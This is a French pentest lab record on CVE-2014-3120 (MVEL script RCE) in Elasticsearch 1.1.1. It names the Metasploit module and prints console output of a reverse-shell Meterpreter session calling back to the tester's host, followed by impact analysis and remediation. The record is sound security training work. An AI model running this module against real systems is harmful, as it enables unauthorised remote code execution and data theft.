# Fiche Vulnérabilité N°06 — API Elasticsearch

## 1. Contexte et Identification

| **Champ** | **Valeur** |
|---|---|
| **Service cible** | API Elasticsearch |
| **Port d'écoute** | `9200/tcp` |
| **Version détectée** | `Elasticsearch 1.1.1` |
| **Référence CVE** | `CVE-2014-3120` |
| **Score CVSS v3** | `7.5 (Élevé)` |
| **Cible autorisée** | ESGIS VulnBox (`10.1.0.1`) |
| **Module Metasploit** | `exploit/multi/elasticsearch/script_mvel_rce` |

## 2. Observations Techniques

- **Description du composant :** Elasticsearch est un moteur de recherche et d'analyse distribué basé sur Apache Lucene. Il expose une API REST sur le port `9200`, permettant d'indexer, de rechercher et de manipuler des données.
- **Vecteur d'exposition :** Port réseau directement accessible à travers le tunnel WireGuard (`10.1.0.1`).
- **Contexte de la faille :** Elasticsearch 1.1.1 présente une vulnérabilité liée à l'exécution de scripts dynamiques MVEL via l'API REST. Dans une configuration vulnérable, un attaquant non authentifié peut provoquer l'exécution de code arbitraire sur le serveur, conduisant à une exécution de code à distance (RCE).

## 3. Preuves Réelles

### 3.1 Configuration du module

- **Capture d'écran :** `screenshots/04-vulnerabilites/06-elasticsearch-options.png`

### 3.2 Exécution et résultat

- **Capture d'écran :** `screenshots/05-resultats/06-elasticsearch-session-poc.png`

**Extrait de la sortie console :**

```text
msf exploit(multi/elasticsearch/script_mvel_rce) > run

[*] Started reverse TCP handler on 10.1.0.6:4444
[*] Trying to execute arbitrary Java...
[*] Discovering remote OS...
[+] Remote OS is 'Linux'
[*] Sending stage (63216 bytes) to 10.1.0.1
[+] Deleted /tmp/HrRrgM.jar
[*] Meterpreter session 5 opened (10.1.0.6:4444 -> 10.1.0.1:44890) at 2026-11-07 15:52:58 +0100
```

### 3.3 Analyse de l'impact

L'obtention d'une session Meterpreter constitue une preuve d'exécution de code à distance sur le système sous-jacent.

Un attaquant pourrait exploiter cette vulnérabilité pour :

- **Exécuter du code arbitraire :** compromettre le serveur Elasticsearch avec les privilèges du compte exécutant le service.
- **Accéder aux données indexées :** lire, modifier ou supprimer les données stockées dans Elasticsearch, qui peuvent contenir des informations sensibles.
- **Compromettre d'autres services :** utiliser le serveur comme point d'appui pour tenter d'accéder à d'autres ressources du réseau interne.

## 4. Mesures Correctives et Remédiation

- **Mise à jour logicielle :** Mettre Elasticsearch à jour vers une version corrigée (à partir de `1.2.0` pour cette vulnérabilité), ou idéalement vers une version stable encore maintenue.

- **Désactivation des scripts dynamiques :** Pour les anciennes versions concernées, examiner les paramètres de sécurité des scripts dans `elasticsearch.yml`. Le paramètre historique suivant peut être utilisé selon la version :

  ```yaml
  script.disable_dynamic: true
  ```

- **Restriction d'accès réseau :** Restreindre l'accès au port `9200` aux seuls hôtes d'administration autorisés, au moyen d'un pare-feu, d'un VPN ou d'un proxy sécurisé.

- **Principe du moindre privilège :** Exécuter Elasticsearch sous un compte utilisateur non privilégié, avec des permissions minimales sur le système de fichiers.

## 5. Conclusion

Le test réalisé sur l'environnement autorisé ESGIS VulnBox a permis d'obtenir une session Meterpreter sur la cible `10.1.0.1`, à travers l'API Elasticsearch exposée sur le port `9200`.

Ce résultat confirme l'impact critique de cette vulnérabilité sur la confidentialité, l'intégrité et la disponibilité du système.

**Statut :** Validé — Exécution de code à distance confirmée par l'ouverture d'une session Meterpreter.
